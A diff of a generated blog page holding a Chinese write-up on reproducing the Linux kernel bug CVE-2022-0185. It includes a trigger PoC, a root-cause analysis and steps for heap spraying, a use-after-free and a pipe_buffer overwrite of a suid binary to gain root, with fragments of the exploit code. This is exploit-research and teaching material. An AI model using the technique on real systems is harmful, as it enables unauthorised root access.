@@ -353,17 +353,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>初尝 pipe_primitive<br>
-<img src="/images/4161b49f/pasted-2.png" alt="exploit"></p>
+        <p>初尝 pipe_primitive<br><img src="/images/4161b49f/pasted-2.png" alt="exploit"></p>
 <span id="more"></span>
-<h2 id="环境准备">环境准备</h2>
-<p>据漏洞发现者所说<sup>[1][2]</sup>，漏洞影响 linux 5.1 版本之后的内核，v5.16.2 已经修复</p>
+
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>据漏洞发现者所说<sup>[1][2]</sup>，漏洞影响 linux 5.1 版本之后的内核，v5.16.2 已经修复</p>
 <p>笔者选取 <strong>5.10.6</strong> 自行编译内核复现，在 ubuntu 20.04 环境下构建，编译选项一般默认就行</p>
 <p>因为笔者所使用的利用方式是参考 <strong>veritas501</strong> 学长的 <strong>pipe primitive</strong><sup>[3][4]</sup>，对含有 root suid 权限的文件进行覆盖达到提权的效果，构建的 busybox rootfs 中准备了一个含有 suid 权限的可执行文件用于被任意写覆盖</p>
 <p><strong>实际环境中可以选择 /usr/bin/mount 等程序作为目标</strong></p>
 <p>环境已打包至 github：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/featherL/CVE-2022-0185-exploit">https://github.com/featherL/CVE-2022-0185-exploit</a></p>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>Syzkaller 给出了一段触发漏洞的 Poc：</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Syzkaller 给出了一段触发漏洞的 Poc：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span>
 
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;endian.h></span></span>
@@ -405,6 +403,7 @@
 	<span class="token punctuation">&#125;</span>
 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>经过简化后：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
@@ -427,6 +426,7 @@
 		<span class="token function">fsconfig</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>翻看 linux 源码可以知道，存在调用链 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fsopen.c#L115">fsopen</a> -&gt; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L278">fs_context_for_mount</a> -&gt; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L267">alloc_fs_context</a> -&gt; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L632">legacy_init_fs_context</a>，这为后面的 fsconfig 系统调用，设置相关操作的虚表 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L619">legacy_fs_context_ops </a></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">fs_context_operations</span> legacy_fs_context_ops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
 	<span class="token punctuation">.</span>free			<span class="token operator">=</span> legacy_fs_context_free<span class="token punctuation">,</span>
@@ -436,6 +436,7 @@
 	<span class="token punctuation">.</span>get_tree		<span class="token operator">=</span> legacy_get_tree<span class="token punctuation">,</span>
 	<span class="token punctuation">.</span>reconfigure		<span class="token operator">=</span> legacy_reconfigure<span class="token punctuation">,</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>对于 <code>fsconfig(fd, FSCONFIG_SET_STRING, key, value, 0)</code> 的调用，则经过调用链 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fsopen.c#L439">fsconfig</a> -&gt; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fsopen.c#L265">vfs_fsconfig_locked</a> -&gt; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L117">vfs_parse_fs_param</a> -&gt; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L533">legacy_parse_param</a></p>
 <p>漏洞发生在 legacy_parse_param 函数中：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">legacy_parse_param</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">fs_context</span> <span class="token operator">*</span>fc<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">fs_parameter</span> <span class="token operator">*</span>param<span class="token punctuation">)</span>
@@ -496,6 +497,7 @@
 	ctx<span class="token operator">-></span>param_type <span class="token operator">=</span> LEGACY_FS_INDIVIDUAL_PARAMS<span class="token punctuation">;</span>
 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以看到 <code>ctx-&gt;legacy_data</code> 通过 kmalloc-4k 分配的一块内存：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -504,11 +506,12 @@
 			<span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
 	<span class="token punctuation">&#125;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 <p>而在写入数据是否越界的判断条件中，使用的是 <code>len &gt; PAGE_SIZE - 2 - size</code>，其中 size 变量是 <strong>unsigned int</strong> 类型，为 <code>ctx-&gt;legacy_data</code> 已经存入数据的大小，当 size 字段大于 <code>PAGE_SIZE - 2</code> 的时候，<code>PAGE_SIZE - 2 - size</code> 结果为负数，但因为运算结果是无符号类型，这就是一个很大的数，条件不成立，后续写入数据的时候就造成了 kmalloc-4k 堆块的溢出</p>
 <p>可以知道 <code>fsconfig(fd, FSCONFIG_SET_STRING, key, value, 0)</code> 是往 <code>ctx-&gt;legacy_data</code> 这个堆块中以 <code>,key=value</code> 的方式写入键值对，不过要注意的是，在 fsconfig 的代码中可以发现 key 和 value 的字符串长度（包括<code>\0</code>）不能超过 <strong>256</strong>，所以要分多次调用来触发漏洞</p>
 <p><strong>需要注意 fsopen 需要 CAP_SYS_ADMIN 权限，可以通过创建用户命名空间的方式来获得该权限</strong></p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>这个漏洞相当于一个 <strong>kmalloc-4k 的任意长度溢出漏洞</strong>，有了之前复现 CVE-2021-22555 的经验，利用起来很简单，甚至都不需要调试</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个漏洞相当于一个 <strong>kmalloc-4k 的任意长度溢出漏洞</strong>，有了之前复现 CVE-2021-22555 的经验，利用起来很简单，甚至都不需要调试</p>
 <p>简单总结一下步骤：</p>
 <ol>
 <li>触发漏洞溢出修改 msg_msg.m_ts</li>
@@ -521,8 +524,7 @@
 </ol>
 <p>最后两步其实可以 skb 读取 pipe_buffer 的 ops 泄露内核地址，然后 skb 劫持 pipe_buffer 的 ops，close(pipe) 进行 ROP，但笔者为了演示 pipe primitive 而不这么做</p>
 <hr>
-<h3 id="prepare-overflow">prepare overflow</h3>
-<p>首先准备下触发漏洞越界写的条件，分多次调用 <code>FSCONFIG_SET_STRING</code>，使得 size 为 <code>PAGE_SIZE - 1</code> 绕过 check，那么再下一次 <code>FSCONFIG_SET_STRING</code> 的时候就是从 4k 堆块的最后一个字节开始溢出写了</p>
+<h3 id="prepare-overflow"><a href="#prepare-overflow" class="headerlink" title="prepare overflow"></a>prepare overflow</h3><p>首先准备下触发漏洞越界写的条件，分多次调用 <code>FSCONFIG_SET_STRING</code>，使得 size 为 <code>PAGE_SIZE - 1</code> 绕过 check，那么再下一次 <code>FSCONFIG_SET_STRING</code> 的时候就是从 4k 堆块的最后一个字节开始溢出写了</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
   <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">fsopen</span><span class="token punctuation">(</span><span class="token string">"ext4"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -550,9 +552,8 @@
   <span class="token comment">// ",=" + buff</span>
   <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="leak-heap">leak heap</h3>
-<p>一图胜千言：<br>
-<img src="/images/4161b49f/pasted-3.png" alt="leak"></p>
+
+<h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>一图胜千言：<br><img src="/images/4161b49f/pasted-3.png" alt="leak"></p>
 <p>首先喷射 4k 大小的 msg_msg，同时附带 64 字节大小的 msg_msgseg，图中橙色标注部分</p>
 <p>再喷射 <code>kmalloc-64 &lt;-&gt; kmalloc-1024</code> 的消息队列，即图中蓝色标注部分</p>
 <p>因为 64 字节的 msg_msgseg 和 64 字节的 msg_msg 很可能从同一个页中分配，那么当 4k 大小的 msg_msg 的 m_ts 被溢出改大后，通过 64 字节的 msg_msgseg 越界读出后面的 64 字节的 msg_msg 结构数据，则可以泄露出其 m_list.next 指向的 kmalloc-1024 地址，</p>
@@ -692,11 +693,12 @@
 
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="create-uaf">create uaf</h3>
-<p>释放 kmalloc_1024 的 msg_msg 结构体，再次触发漏洞，修改某个 msg_msg.m_list.next  为 kmalloc_1024，那么就构造了对该地址的 UAF 了</p>
+
+<h3 id="create-uaf"><a href="#create-uaf" class="headerlink" title="create uaf"></a>create uaf</h3><p>释放 kmalloc_1024 的 msg_msg 结构体，再次触发漏洞，修改某个 msg_msg.m_list.next  为 kmalloc_1024，那么就构造了对该地址的 UAF 了</p>
 <p>因为漏洞的溢出写入的是字符串 <code>,key=value</code>，且从 key 开始的位置就是 msg_msg.m_list.next 了，最后还会附加 <code>=</code>，且 kmalloc_1024 最低字节必然是 <code>\0</code>，被覆盖成 <code>=</code> 就不对了，所以无法直接覆盖成  kmalloc_1024，但是可以把 m_list.next 指向 kmalloc_1024 + offset 上，以避免 <code>\0</code></p>
 <p>然后在 <code>kmalloc_1024 + offset</code> 处，伪造一个 msg_msg，其 m_list.next 指向 kmalloc_1024，也就是伪造成下面的效果：</p>
 <pre class="line-numbers language-none"><code class="language-none">corrupted_msg_msg -&gt; kmalloc_1024 + offset -&gt; kmalloc_1024<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="/images/4161b49f/pasted-4.png" alt="create_uaf"></p>
 <p><strong>要注意 unlink 时 next/prev 指针指向的区域可写</strong></p>
 <p>代码如下：</p>
@@ -807,8 +809,8 @@
 
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="pipe-primitive">pipe_primitive</h3>
-<p>此时，通过 corrupted_msg_msg（即 fake_msqid）释放 kmalloc_1024 堆块，然后喷射 pipe_buffer 占位，同时调用 splice 把目标文件缓存页接入 pipe_buffer</p>
+
+<h3 id="pipe-primitive"><a href="#pipe-primitive" class="headerlink" title="pipe_primitive"></a>pipe_primitive</h3><p>此时，通过 corrupted_msg_msg（即 fake_msqid）释放 kmalloc_1024 堆块，然后喷射 pipe_buffer 占位，同时调用 splice 把目标文件缓存页接入 pipe_buffer</p>
 <p>利用 skb 修改文件缓存页对应的 pipe_buffer 的 flags 为 PIPE_BUF_FLAG_CAN_MERGE，向 pipe 写入数据即可成功修改只有读权限的 suid 程序文件</p>
 <p>通过覆盖 suid 程序文件为恶意代码，执行恶意代码 getshell 提权：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">pipe_primitive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -898,8 +900,8 @@
     <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"overwrite attack file failed: 0x%08x"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="exp">exp</h3>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -static -o exp exp.c</span>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -static -o exp exp.c</span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span>
@@ -1509,11 +1511,10 @@
 
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="总结">总结</h2>
-<p>经过 CVE-2021-22555 和本文的 CVE-2022-0185，对于这种能转化为 kmalloc-1024 的 UAF 的漏洞，本地提权的利用方式都很简单，只要 skb 修改 pipe_buffer 做 pipe primitive 就好了，而且 pipe primitive 不用 bypass kaslr，几乎一个 exp 就能通杀含有漏洞的 linux 各个版本，非常好用</p>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过 CVE-2021-22555 和本文的 CVE-2022-0185，对于这种能转化为 kmalloc-1024 的 UAF 的漏洞，本地提权的利用方式都很简单，只要 skb 修改 pipe_buffer 做 pipe primitive 就好了，而且 pipe primitive 不用 bypass kaslr，几乎一个 exp 就能通杀含有漏洞的 linux 各个版本，非常好用</p>
 <p>但是对于 google <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/google/kctf">kctf</a> 或者其他容器环境下，利用漏洞逃逸容器就不能用这种方式了，需要用 skb 劫持 pipe_buffer ops 进行 ROP 提权后执行 <code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 来获得 root namespace 的 root 权限</p>
-<h2 id="参考">参考</h2>
-<blockquote>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
 <p>[1] <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.willsroot.io/2022/01/cve-2022-0185.html">https://www.willsroot.io/2022/01/cve-2022-0185.html</a></p>
 </blockquote>
 <blockquote>
@@ -1620,13 +1621,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">379k</span>
+    <span title="站点总字数">380k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:45</span>
+    <span title="站点阅读时长">5:46</span>
   </span>
 </div>
 <div class="busuanzi-count">
